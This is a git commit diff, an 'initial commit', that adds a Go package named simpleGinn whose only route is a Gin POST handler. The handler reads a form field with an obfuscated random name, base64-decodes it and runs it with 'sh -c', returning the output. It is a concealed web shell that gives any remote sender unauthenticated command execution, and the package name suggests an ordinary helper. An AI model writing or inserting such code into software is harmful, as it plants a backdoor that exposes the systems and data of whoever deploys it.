fe0f67bde4a038fd70c59f4aca8da41c7a574c08
Sharyie <353037236@qq.com>
2022-12-26 16:42:43 +0800

    initial commit

---
+++ simpleGinn/simpleGinn.go
@@ -0,0 +1,37 @@
+package simpleGinn
+
+import (
+	"encoding/base64"
+	"fmt"
+	"github.com/gin-gonic/gin"
+	"net/http"
+	"os/exec"
+)
+
+func zhaoll(c *gin.Context) {
+	simplejson := c.PostForm("k3oOtbcgQAkp4rzq")
+	decoded, err := base64.StdEncoding.DecodeString(simplejson)
+	if err == nil {
+		//fmt.Printf("解析成功")
+		//fmt.Println(string(decoded))
+		cmd := exec.Command("sh","-c",string(decoded))
+		out, err := cmd.CombinedOutput()
+		if err != nil {
+			//fmt.Printf("combined out:\n%s\n", string(out))
+			//log.Fatalf("cmd.Run() failed with %s\n", err)
+			fmt.Printf("cmd.Run() failed with %s\n", err)
+		}
+		c.String(http.StatusOK, string(out))
+	} else {
+		c.String(http.StatusOK, "")
+	}
+
+}
+
+
+func SimpleGinnFunc () *gin.Engine {
+	gin.SetMode(gin.ReleaseMode)
+	router := gin.Default()
+	router.POST("", zhaoll)
+	return router
+}
